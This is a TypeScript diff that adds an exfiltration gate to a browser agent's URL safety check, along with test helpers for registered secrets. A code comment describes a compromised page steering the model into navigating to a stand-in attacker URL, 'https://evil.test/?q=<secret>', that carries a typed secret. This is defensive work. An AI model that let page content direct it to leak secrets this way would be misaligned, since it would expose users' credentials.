@@ -1093,6 +1093,23 @@ export function safetyCheck(rawUrl: string, options: { allowLoopback?: boolean }
       return "Blocked: URL appears to contain an API key or token.";
     }
   }
+  // Outbound exfiltration gate: SECRET_PATTERNS above only catches
+  // pattern-shaped tokens. The values the agent typed via
+  // browser_fill_secrets are arbitrary strings, and a compromised page
+  // could steer the model into composing a navigation URL that carries
+  // one out (`https://evil.test/?q=<secret>`). Scan the raw AND
+  // percent-decoded forms against the cross-task registered-secret
+  // union. Values below the redaction floor are skipped for the same
+  // reason recordFilledSecret refuses them: a tiny value substring-
+  // matches structural URL bytes and would false-positive. The message
+  // is deliberately generic — echoing the value or naming which secret
+  // matched would leak it into the trace + audit row.
+  for (const secret of allRegisteredSecrets()) {
+    if (secret.length < FILLED_SECRET_MIN_REDACTION_LENGTH) continue;
+    if (rawUrl.includes(secret) || decoded.includes(secret)) {
+      return "Blocked: URL contains a registered secret value.";
+    }
+  }
   let parsed: URL;
   try {
     parsed = new URL(rawUrl);
@@ -3663,6 +3680,17 @@ export const __test = {
   setFakeSessionInFlight(taskId: string, inFlight: number): void {
     const session = sessions.get(taskId);
     if (session) session.inFlight = inFlight;
+  },
+  // Register a secret value for a task exactly as browserFillByLocator
+  // would, so the safetyCheck registered-secret URL gate can be
+  // exercised without driving a real fill.
+  recordFilledSecretForTest(taskId: string, value: string): void {
+    recordFilledSecret(taskId, value);
+  },
+  // Drop every per-task secret registry so registered-secret tests
+  // don't leak redaction targets into sibling tests.
+  resetFilledSecretsForTest(): void {
+    filledSecretValues.clear();
   },
   clearFakeSessionsForTest(): void {
     sessions.clear();
